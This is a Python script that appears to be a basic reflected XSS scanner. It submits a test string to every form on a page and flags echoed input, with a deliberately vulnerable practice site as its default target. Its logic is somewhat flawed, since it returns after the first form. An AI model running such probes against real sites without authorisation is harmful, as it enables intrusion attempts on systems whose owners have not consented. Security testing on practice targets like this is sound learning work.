from socket import *
import optparse
import requests
from pprint import pprint
from urllib.request import urlopen
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin

#https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

def getForms(url):

    req = bs(requests.get(url).content, "html.parser")
    return req.find_all("form")
    """arr = []
    for link in bs.find_all("a"):
        lien = link.get("href")
        print(lien)

        if(lien[-1] == "l" and lien[-2] == "m" and lien[-3] == "t" and lien[-4] == "h" and lien[-5] == "."):
            arr.append(lien)
        if(lien[-1] == "p" and lien[-2] == "h" and lien[-3] == "p" and lien[-4] == "."):
            arr.append(lien)
    print("ahor next")
    for m in arr:
        print(m)"""

def submitForm(form_details, url, value):

    # construct the full URL (if the url provided in action is relative)
    target_url = urljoin(url, form_details["action"])
    print(target_url)
    print(form_details)
    # get the inputs
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        # replace all text and search values with `value`
        if input["type"] == "text" or input["type"] == "search" or input["type"] == "submit":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            # if input name and value are not None,
            # then add them to the data of form submission
            data[input_name] = input_value

    print(f"[+] Submitting malicious payload to {target_url}")
    print(f"[+] Data: {data}")
    if form_details["method"] == "post":
        print(target_url)
        return requests.post(target_url, data=data)
    else:
        # GET request
        print(target_url)
        return requests.get(target_url, params=data)


def detectXSS(url):

    # take all the forms presents in the url
    forms = getForms(url)
    if(len(forms) == 0):
        print("Not forms")
        return False
    else:
        print(f"{len(forms)} forms...")

    #Here we take an easy exemple but normally we do it with a big list of scripts
    js_script = "<h1>hello world</h1>"

    is_vulnerable = False
    # iterate over all forms
    for form in forms:
        details = {}
        # get the form action (target url)
        action = form.attrs.get("action", "").lower()
        # get the form method
        method = form.attrs.get("method", "get").lower()
        # get name and type
        inputs = []
        #req = bs(requests.get(url).content, "html.parser")
        for input_tag in form.find_all("input"):
            print("aqui si ")
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            inputs.append({"type": input_type, "name": input_name})
            # create the dictionnary
            details["action"] = action
            details["method"] = method
            details["inputs"] = inputs
            cont = submitForm(details, url, js_script).content.decode()

            if js_script in cont:
                print(f"XSS DETECTED!!!!!!")
                print(f"IN FORM:")
                pprint(details)
                is_vulnerable = True
                # won't break because we want to print available vulnerable forms


        return is_vulnerable


if __name__ == "__main__":
    url = "http://testphp.vulnweb.com/search.php"
    print(detectXSS(url))
